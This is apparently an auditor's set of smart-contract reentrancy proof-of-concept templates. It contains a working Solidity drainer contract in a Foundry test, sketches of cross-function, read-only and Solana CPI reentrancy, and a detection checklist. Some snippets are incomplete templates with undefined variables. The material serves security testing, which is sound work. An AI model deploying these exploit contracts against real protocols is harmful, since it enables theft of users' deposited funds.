# Reentrancy PoC Templates

## EVM - Foundry
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IVulnerable {
    function deposit() external payable;
    function withdraw() external;
    function balanceOf(address) external view returns (uint256);
}

contract ReentrancyExploit {
    IVulnerable public target;
    address public owner;
    uint256 public attackCount;

    constructor(address _target) {
        target = IVulnerable(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance >= 1 ether && attackCount < 10) {
            attackCount++;
            target.withdraw();
        }
    }

    function withdraw() external {
        payable(owner).transfer(address(this).balance);
    }
}

contract ReentrancyTest is Test {
    IVulnerable target;
    ReentrancyExploit exploit;
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy vulnerable contract
        target = IVulnerable(deployCode("Vulnerable.sol"));
        
        // Fund target with victim deposits
        vm.deal(address(this), 10 ether);
        target.deposit{value: 10 ether}();
        
        // Setup attacker
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        exploit = new ReentrancyExploit(address(target));
    }

    function testReentrancyAttack() public {
        uint256 targetBalanceBefore = address(target).balance;
        
        vm.prank(attacker);
        exploit.attack{value: 1 ether}();
        
        vm.prank(attacker);
        exploit.withdraw();
        
        assertGt(attacker.balance, 1 ether, "Attack should profit");
        assertLt(address(target).balance, targetBalanceBefore, "Target drained");
    }
}
```

## EVM - Cross-Function Reentrancy
```solidity
contract CrossFunctionReentrancy {
    IVulnerable public target;
    bool public attacked;

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }

    receive() external payable {
        if (!attacked) {
            attacked = true;
            // Call different function during reentrancy
            target.transfer(address(this), target.balanceOf(address(this)));
        }
    }
}
```

## EVM - Read-Only Reentrancy
```solidity
contract ReadOnlyReentrancy is Test {
    function testReadOnlyReentrancy() public {
        // Attacker contract calls view function during callback
        // Price oracle returns stale data during reentrancy
        
        vm.prank(attacker);
        attackContract.exploit();
        
        // Oracle price was manipulated during view call
        assertEq(oracle.getPrice(), manipulatedPrice);
    }
}

contract AttackContract {
    function exploit() external {
        // Trigger callback that reads oracle
        lendingPool.withdraw();
    }
    
    receive() external payable {
        // During this callback, oracle.getPrice() returns wrong value
        // because pool state hasn't been updated yet
        uint256 price = oracle.getPrice(); // Stale!
        leveragedPosition.openPosition(price);
    }
}
```

## Solana - Anchor
```rust
#[test]
fn test_reentrancy() {
    // Solana uses CPI (Cross-Program Invocation) instead of callbacks
    // Reentrancy is harder but possible through CPI
    
    let program = program_test!(target);
    let attacker = Keypair::new();
    
    // Attack via malicious CPI callback
    let ix = Instruction {
        program_id: target::ID,
        accounts: vec![
            AccountMeta::new(attacker.pubkey(), true),
            AccountMeta::new(vault_pda, false),
        ],
        data: target::instruction::Withdraw { amount: 1000 }.data(),
    };
    
    // If target calls back to attacker program before updating state...
    process_transaction(&[ix], &[&attacker]).unwrap();
}
```

## Detection Checklist
- [ ] External calls before state updates
- [ ] Callbacks (receive, fallback, hooks)
- [ ] Cross-function state dependencies
- [ ] Read-only functions called during execution
- [ ] Missing reentrancy guards
- [ ] CPI calls in Solana programs
